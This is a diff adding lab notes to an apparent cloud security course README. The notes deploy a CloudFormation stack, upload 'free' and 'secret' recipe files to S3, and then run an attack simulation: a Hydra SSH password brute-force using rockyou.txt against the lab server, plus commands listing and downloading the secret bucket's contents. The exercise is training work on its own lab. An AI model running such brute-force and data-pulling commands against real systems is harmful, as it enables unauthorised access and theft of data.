@@ -478,3 +478,54 @@ Once your project has been submitted and reviewed - to prevent undesired charges
 
 Bake one of the desserts from the recipe text files and submit a picture. :-)
 
+1. https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/setup-credentials.html
+
+$ aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://starter/c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=recipe --capabilities CAPABILITY_IAM
+
+
+2. Once you see Status is CREATE_COMPLETE for all 3 stacks, obtain the required parameters needed for the project.
+
+ApplicationInstanceIP	ec2-34-225-89-253.compute-1.amazonaws.com
+ApplicationURL	c1-web-service-alb-1190853446.us-east-1.elb.amazonaws.com	
+AttackInstanceIP	ec2-54-226-115-202.compute-1.amazonaws.com
+
+3. Upload data to S3 buckets
+aws s3 cp free_recipe.txt s3://cand-c3-free-recipes-788284001648/ --region us-east-1
+aws s3 cp secret_recipe.txt s3://cand-c3-secret-recipes-788284001648/ --region us-east-1
+
+4. Test the application
+
+http://c1-web-service-alb-1190853446.us-east-1.elb.amazonaws.com/free_recipe
+
+## Exercise 3: Attack Simulation
+
+https://www.youtube.com/watch?v=6phF7bxY2Eo
+
+### 1. Log into the attack simulation server using your SSH key-pair.
+ssh -i <your private key file> ubuntu@<AttackInstanceIP>
+
+
+```ssh -i "recipe.pem" ubuntu@18.232.71.225```
+
+### 2. Run the below commands to start a brute force attack against the application server. You will need the application server hostname for this.
+date
+hydra -l ubuntu -P rockyou.txt ssh://<YourApplicationServerDnsNameHere>
+
+sudo apt install hydra
+hydra -l ubuntu -P rockyou.txt ssh://ec2-34-225-89-253.compute-1.amazonaws.com
+
+## Task 2
+1. Make sure you're still logged into the attack instance and run the following API calls to view and download files from the secret recipes S3 bucket. You will need the name of the S3 bucket for this.
+
+# view the files in the secret recipes bucket
+aws s3 ls  s3://cand-c3-secret-recipes-788284001648/  --region us-east-1
+
+# download the files
+aws s3 cp s3://cand-c3-secret-recipes-788284001648/secret_recipe.txt  .  --region us-east-1
+
+# view contents of the file
+cat secret_recipe.txt
+
+
+E4T2
+
